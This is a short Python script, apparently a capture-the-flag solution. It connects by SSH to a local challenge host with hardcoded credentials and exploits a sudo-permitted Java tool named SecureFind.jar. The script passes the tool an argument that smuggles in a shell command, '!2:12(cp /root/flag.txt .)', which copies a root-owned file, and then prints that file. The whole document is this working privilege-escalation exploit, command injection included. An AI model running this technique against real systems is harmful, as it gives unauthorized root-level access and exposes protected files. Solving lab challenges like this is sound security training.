#!/usr/bin/python3

import paramiko

HOST="127.0.0.1"
PORT=2222
USERNAME="kaizen"
PASSWORD="K41Z3N"

def get_flag(ssh):
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("sudo /usr/local/openjdk-24/bin/java -jar /home/kaizen/SecureFind.jar '!2:12(cp /root/flag.txt .)'") 
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("cat /home/kaizen/flag.txt") 
    print(ssh_stdout.read())

def login():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST,PORT,USERNAME,PASSWORD)
    return ssh
    

ssh = login()
get_flag(ssh)